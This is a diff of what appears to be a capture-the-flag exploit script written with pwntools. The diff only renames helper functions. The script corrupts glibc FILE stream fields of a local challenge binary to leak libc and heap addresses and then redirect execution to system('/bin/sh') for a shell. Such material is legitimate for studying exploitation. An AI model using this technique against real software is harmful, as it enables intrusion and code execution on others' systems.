@@ -588,10 +588,10 @@ def start():
         return process('./chall')
 r = start()
 #r.timeout = 1
-def flush():
+def draw():
     r.sendline(b"1")
     #r.recvuntil(b">")
-def trick(offset, value):
+def play(offset, value):
     r.sendline(b"2")
 # sleep(1)
     r.sendlineafter(b"Mana:", str(offset).encode())
@@ -600,7 +600,7 @@ def trick(offset, value):
 def write_addr(offset, addr):
     addr = p64(addr)
     for i in range(8):
-        trick(offset+i, addr[i])
+        play(offset+i, addr[i])
 #========= exploit here ===================
 # Setting the offsets for the filestream
 _flags =0x0
@@ -621,21 +621,21 @@ _fileno = 0x70
 _mode=0xc0
 _vtable = 0xd8
 #executing _IO_file_doallocate to populate _IO_buf_base with a heap address
-trick(_vtable, 0xa8)
-flush()
+play(_vtable, 0xa8)
+draw()
 sleep(1)
 #restoring the vtable
-trick(_vtable, 0xa0)
+play(_vtable, 0xa0)
 #making _IO_write_ptr > _IO_write_base 
-trick(_IO_write_ptr, 1)
-flush()
+play(_IO_write_ptr, 1)
+draw()
 sleep(1)
 #leaking libc
-trick(_fileno, 1)
-trick(_IO_write_ptr, 0x78)
-trick(_IO_write_base, 0x70)
-trick(_IO_read_end, 0x70)
-flush()
+play(_fileno, 1)
+play(_IO_write_ptr, 0x78)
+play(_IO_write_base, 0x70)
+play(_IO_read_end, 0x70)
+draw()
 sleep(1)
 #receiving the leak and calculating libc base address
 leak = u64(r.recvuntil(b"Done.").split(b"Done.")[0][1:8].ljust(8,b"\x00"))
@@ -643,7 +643,7 @@ log.info(f"leak = {hex(leak)}")
 libc.address = leak - 0x1e8f60
 log.info(f"libc = {hex(libc.address)}")
 #getting a heap leak
-trick(_fileno, 1)
+play(_fileno, 1)
 #calculating topchunk address in the main arena
 topchunk = libc.address + 0x1ecbe0
 log.info(f"top_chunk = {hex(topchunk)}")
@@ -652,7 +652,7 @@ write_addr(_IO_write_base, topchunk)
 write_addr(_IO_read_end, topchunk)
 #write_addr(_flags, (0xfbad1800 | 0x8000))
 sleep(1)
-flush()
+draw()
 #receiving the leak and calculating addresses
 heap_leak = u64(r.recvuntil(b"Done.").split(b"Done.")[0][1:8].ljust(8, b"\x00"))
 log.info(f"heap_leak = {(hex(heap_leak))}")
@@ -672,7 +672,7 @@ write_addr(_IO_buf_base, libc.sym.system) # function to call
 log.info(f"/bin/sh = {hex(next(libc.search(b'/bin/sh')))}")
 write_addr(_IO_save_base, next(libc.search(b'/bin/sh'))) # arg of function
 #drop a shell
-flush()
+draw()
 #========= interactive ====================
 r.interactive()
 ```
